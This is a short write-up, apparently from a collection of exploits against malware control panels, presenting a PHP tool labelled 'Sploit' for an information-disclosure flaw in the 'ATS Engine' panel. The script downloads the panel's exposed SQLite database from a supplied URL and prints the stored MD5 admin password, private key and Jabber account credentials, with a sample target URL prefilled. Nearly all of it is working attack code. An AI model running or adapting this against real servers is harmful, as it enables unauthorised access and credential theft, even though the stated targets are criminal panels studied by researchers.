#### ATS Engine

Type: Information Disclosure<br>
Author: [Xylitol](https://twitter.com/Xylit0l)

```
<pre>
<?php
    $url = getURL();

    if ($url !== NULL) {
        $database = @file_get_contents($url . '/db/database.db');

        if ($database !== FALSE) {
            file_put_contents('tmp.db', $database);

            $password_md5     = getOption('password_md5');
            $pkey             = getOption('pkey');
            $jabber_on        = getOption('jabber_on');
            $jabber_sender    = getOption('jabber_sender');
            $jabber_password  = getOption('jabber_password');
            $jabber_port      = getOption('jabber_port');
            $jabber_recipient = getOption('jabber_recepient');

            writeLine('URL:          ' . htmlentities($url));
            writeLine('MD5 password: ' . htmlentities($password_md5));
            writeLine('pkey:         ' . htmlentities($pkey));
            writeLine('Jabber        ' . htmlentities($jabber_on));
            writeLine('Sender:       ' . htmlentities($jabber_sender));
            writeLine('Password:     ' . htmlentities($jabber_password));
            writeLine('Port:         ' . htmlentities($jabber_port));
            writeLine('Recipient:    ' . htmlentities($jabber_recipient));

            unlink('tmp.db');
        }
        else {
            writeLine('Cannot get database...');
        }

        writeLine('');
        echo('<a href="' . basename($_SERVER['PHP_SELF']) . '">Back</a>');
    }
    else {
?>
<form method="POST">
<label for="url">URL:</label> <input id="url" name="url" type="url" value="http://secureserver02792.com/bncadmin/" />
<input type="submit" value="Sploit" />
</form>
<?php
    }

    function getURL() {
        global $_POST;

        if (isset($_POST['url'])      &&
            !is_array($_POST['url'])  &&
            is_string($_POST['url'])  &&
            strlen($_POST['url']) > 0 &&
            filter_var($_POST['url'], FILTER_VALIDATE_URL)) {
            return $_POST['url'];
        }

        return NULL;
    }

    function writeLine($str) {
        echo($str . "\n");
    }

    function getOption($option) {
        $db     = new SQLite3('tmp.db');
        $sql    = 'SELECT value AS result FROM options WHERE param="' . $option . '"';
        $result = $db-> querySingle($sql, true);

        $db-> close();

        return sizeof($result) > 0 ? $result['result'] : '';
    }
?>
</pre>
```
